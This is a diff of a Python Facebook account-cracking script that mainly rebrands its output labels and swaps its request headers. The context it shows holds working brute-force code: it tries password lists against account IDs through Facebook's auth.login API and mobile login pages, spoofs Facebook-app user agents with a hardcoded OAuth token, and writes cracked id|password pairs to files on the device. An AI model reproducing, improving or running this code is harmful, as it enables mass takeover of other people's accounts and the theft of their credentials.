@@ -1,6 +1,6 @@
 #Mark
 #Facebook:  Mark Sy
-#Github : MARK
+	#Github : MARK
 from os import path
 import os,base64,zlib,pip,urllib
 try:
@@ -78,8 +78,8 @@ logo = ("""
  ┃ [\033[1;91m✓\033[1;92m] TOOL      \033[1;91m: \033[1;92mCLONING TOOL             
  ┃ [\033[1;91m✓\033[1;92m] STATUS    \033[1;91m: \033[1;92mFREE  &  TEST                    
  ┃ [\033[1;91m✓\033[1;92m] USAGE    \033[1;91m: \033[1;92mDATA & WIFI                    
- ┃ [\033[1;91m✓\033[1;92m] FACEBOOK  \033[1;91m: \033[1;92m         
- ┃ [\033[1;91m✓\033[1;92m] VERSION \033[1;91m: \033[1;92m0.1         
+ ┃ [\033[1;91m✓\033[1;92m] FBLINK  \033[1;91m: \033[1;92mwww.facebook.com/m4rk.sy       
+ ┃ [\033[1;91m✓\033[1;92m] VERSION \033[1;91m: \033[1;92m0.2        
  ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
 
 def linex():
@@ -196,15 +196,15 @@ def ffb(ids,names,passlist):
                         if "c_user" in Shahin:
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print(f'\r\r\033[1;32m [JARED-OK] %s | %s'%(ids,pas))
-                                open(f'/sdcard/JARED-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                                print(f'\r\r\033[1;32m [M4RK-OK] %s | %s'%(ids,pas))
+                                open(f'/sdcard/M4RK-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                 #cek_apk(session,coki)
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in Shahin:
                                 if 'y' in pcp:
-                                        print(f'\r\r\x1b[38;5;126m [JARED-CP] '+ids+' | '+pas+'\033[1;97m')
-                                        open(f'/sdcard/JARED-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\x1b[38;5;126m [M4RK-CP] '+ids+' | '+pas+'\033[1;97m')
+                                        open(f'/sdcard/M4RK-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -239,15 +239,15 @@ def ffb1(ids,names,passlist):
                         if "c_user" in Shahin:
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print(f'\r\r\033[1;32m [MARK-OK] %s | %s'%(ids,pas))
+                                print(f'\r\r\033[1;32m [M4RK-OK] %s | %s'%(ids,pas))
                                 #cek_apk(session,coki)
-                                open(f'/sdcard/MARK-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                                open(f'/sdcard/M4RK-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in Shahin:
                                 if 'y' in pcp:
-                                        print(f'\r\r\x1b[38;5;126m [INNOCENT-CP] '+ids+' | '+pas+'\033[1;97m')
-                                        open(f'/sdcard/MARK-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\x1b[38;5;126m [M4RK-CP] '+ids+' | '+pas+'\033[1;97m')
+                                        open(f'/sdcard/M4RK-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -261,7 +261,7 @@ def ffb1(ids,names,passlist):
 def api(ids,names,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write(f'\r\r\033[1;37m [MARK] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write(f'\r\r\033[1;37m [M4RK] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         fn = names.split(f' ')[0]
                         try:
                                 ln = names.split(f' ')[1]
@@ -275,7 +275,7 @@ def api(ids,names,passlist):
                                 gtt=random.choice(xxxxx)
                                 gttt=random.choice(xxxxx)
                                 android_version=str(random.randrange(6,13))
-                                ua_string = f'DMARKk/2.1.0 (linex; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
+                                ua_string = f'DM4RKk/2.1.0 (linex; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                 device_id = str(uuid.uuid4())
                                 adid = str(uuid.uuid4())
                                 data = {'adid':adid,
@@ -295,31 +295,39 @@ def api(ids,names,passlist):
                                         "method": "auth.login",
                                         "fb_api_req_friendly_name": "authenticate",
                                         "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
-                                head = {
-                                        'content-type':'application/x-www-form-urlencoded',
-                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
-                                        'x-fb-connection-type':'unknown',
-                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-                                        'user-agent':ua_string,
-                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
-                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
-                                        'x-fb-connection-quality':'EXCELLENT',
-                                        'x-fb-friendly-name':'authenticate',
-                                        'accept-encoding':'gzip, deflate',
-                                        'x-fb-http-engine':     'Liger'}
+                                head = {"authority": 'free.facebook.com',
+            "method": 'GET',
+            "scheme": 'https',
+            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
+            "accept-encoding": 'gzip, deflate, br',
+            "accept-language": 'en-US,en;q=1',
+            'cache-control': 'no-cache, no-store, must-revalidate',
+            "referer": 'https://t.facebook.com/',
+            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;JIHAD";v="8", "Chromium";v="75"',
+            "sec-ch-ua-mobile": '?1',
+            "sec-ch-ua-platform": "Windows",
+            "sec-fetch-dest": 'document',
+            "sec-fetch-mode": 'navigate',
+            "sec-fetch-site": 'same-origin',
+            "sec-fetch-user": '?0',
+            "pragma": 'no-cache',
+            "priority": 'u=0',
+            'cross-origin-resource-policy': 'cross-origin',
+            "upgrade-insecure-requests": '1',
+            "user-agent": pro}
                                 url = 'https://b-api.facebook.com/method/auth.login'
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
-                                        print(f'\r\r\033[1;32m [MARK-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        open(f'/sdcard/MARK-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\033[1;32m [M4RK-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        open(f'/sdcard/M4RK-OK.txt','a').write(ids+'|'+pas+'\n')
                                         #cek_apk(session,coki)
                                         oks.append(ids)
                                         break
                                 elif 'www.facebook.com' in q['error_msg']:
                                         if 'y' in pcp:
-                                                print(f'\r\r\x1b[38;5;126m [MARK-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open(f'/sdcard/MARK-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                print(f'\r\r\x1b[38;5;126m [M4RK-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open(f'/sdcard/M4RK-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                 else:
@@ -332,7 +340,7 @@ def api(ids,names,passlist):
 def api1(ids,names,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write(f'\r\r\033[1;37m [MARK] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write(f'\r\r\033[1;37m [M4RK] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         fn = names.split(f' ')[0]
                         try:
                                 ln = names.split(f' ')[1]
@@ -346,7 +354,7 @@ def api1(ids,names,passlist):
                                 gtt=random.choice(xxxxx)
                                 gttt=random.choice(xxxxx)
                                 android_version=str(random.randrange(6,13))
-                                ua_string = f'DMARKk/2.1.0 (linex; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/es_CU;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
+                                ua_string = f'DM4RKk/2.1.0 (linex; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/es_CU;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                 device_id = str(uuid.uuid4())
                                 adid = str(uuid.uuid4())
                                 data = {'adid':adid,
@@ -389,8 +397,8 @@ def api1(ids,names,passlist):
                                         break
                                 elif 'www.facebook.com' in q['error']['message']:
                                         if 'y' in pcp:
-                                                print(f'\r\r\x1b[38;5;126m [MARK-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open(f'/sdcard/MARK-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                print(f'\r\r\x1b[38;5;126m [M4RK-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open(f'/sdcard/M4RK-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                         else:
@@ -426,15 +434,15 @@ def ffb7(ids,names,passlist):
                         if "c_user" in Shahin:
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print(f'\r\r\033[1;32m [MARK-OK] %s | %s'%(ids,pas))
-                                open(f'/sdcard/JARED-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                                print(f'\r\r\033[1;32m [M4RK-OK] %s | %s'%(ids,pas))
+                                open(f'/sdcard/M4RK-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                 #cek_apk(session,coki)
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in Shahin:
                                 if 'y' in pcp:
-                                        print(f'\r\r\x1b[38;5;126m [MARK-CP] '+ids+' | '+pas+'\033[1;97m')
-                                        open(f'/sdcard/MARK-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\x1b[38;5;126m [M4RK-CP] '+ids+' | '+pas+'\033[1;97m')
+                                        open(f'/sdcard/M4RK-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -524,7 +532,7 @@ def rcrack_free(idf,pwv):
 		for ps in pwv:
 	#		print(idf+'|'+ps)
 			#session = requests.Session()
-			sys.stdout.write(f'\r\r\033[1;37m [MARK] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+			sys.stdout.write(f'\r\r\033[1;37m [M4RK] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 			session = requests.Session()
 			pro = random.choice(useragent)
 			free_fb = session.get('https://m.alpha.facebook.com').text
